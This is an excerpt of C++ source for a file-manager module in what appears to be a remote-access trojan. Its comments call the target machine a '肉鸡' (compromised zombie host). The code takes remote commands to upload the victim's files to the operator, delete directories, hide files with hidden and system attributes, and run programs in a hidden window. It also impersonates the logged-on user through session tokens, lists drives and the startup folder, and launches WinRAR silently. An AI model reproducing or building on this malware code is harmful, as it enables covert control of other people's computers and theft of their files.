...
void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	...
	case COMMAND_DELETE_FILE:                       // 删除文件
		...
		break;
	case COMMAND_HIDE_FILE:                       // 隐藏
		SetFileAttributes((char*)lpBuffer + 1, FILE_ATTRIBUTE_HIDDEN| FILE_ATTRIBUTE_SYSTEM);
		SendToken(TOKEN_HIDE_FINISH);
		break;
	case COMMAND_DELETE_DIRECTORY:// 删除目录
		DeleteDirectory((char*)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DOWN_FILES:			// 下载肉鸡上的文件
		UploadToRemote(lpBuffer + 1);
		break;
	case COMMAND_CONTINUE:				// 继续传
		SendFileData(lpBuffer + 1);
		break;
	case COMMAND_CREATE_FOLDER:  //创建文件夹
		CreateFolder(lpBuffer + 1);
		break;
	case COMMAND_RENAME_FILE:     //重命名
		Rename(lpBuffer + 1);
		break;
	case COMMAND_STOP:					//停止
		StopTransfer();
		break;
	case COMMAND_SET_TRANSFER_MODE:   //设置传输模式
	...
	case COMMAND_FILE_DATA:
		...
		break;
	case COMMAND_OPEN_FILE_SHOW:              //显示运行
		OpenFile((char*)lpBuffer + 1, SW_SHOW);
		break;
	case COMMAND_OPEN_FILE_HIDE:					//隐藏运行
...
bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	...
	char* lpExt = strrchr((char*)lpFile, '.');
	if (!lpExt)
		return false;
...
UINT CFileManager::SendDriveList()
{
	...
	len = lstrlen((char*)&DriveList[2]) + 3;

	DriveList[ len] = 0;


	SHGetFolderPath(NULL, CSIDL_COMMON_STARTUP, hTokenAcsi, SHGFP_TYPE_CURRENT, (char*)&DriveList[len]);

	len += lstrlen((char*)&DriveList[len]);
	//	RevertToSelf();
	...
	for (dwOffset = len +1; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)
	{
...
HANDLE CFileManager::ImpersonateLoggedOnUserWrapper()
{
	typedef DWORD
	(WINAPI
		* WTSGetActiveConsoleSessionIdT)(
			);

	WTSGetActiveConsoleSessionIdT pWTSGetActiveConsoleSessionId = (WTSGetActiveConsoleSessionIdT)GetProcAddress(LoadLibrary("KERNEL32.dll"), "WTSGetActiveConsoleSessionId");
	...
	HMODULE wtsaapi32 = LoadLibrary("WTSAPI32.dll");
	WTSQueryUserTokenT pWTSQueryUserToken = (WTSQueryUserTokenT)GetProcAddress(wtsaapi32, "WTSQueryUserToken");

	HANDLE hToken = NULL;
	if (pWTSGetActiveConsoleSessionId && pWTSQueryUserToken && ImpersonateLoggedOnUser)
	{
...
void CFileManager::ExeCompress(BYTE* lpBuffer)
{
	...
	ShellExecute(NULL, "open", "WinRar", (LPCSTR)lpBuffer, "", SW_HIDE);
}
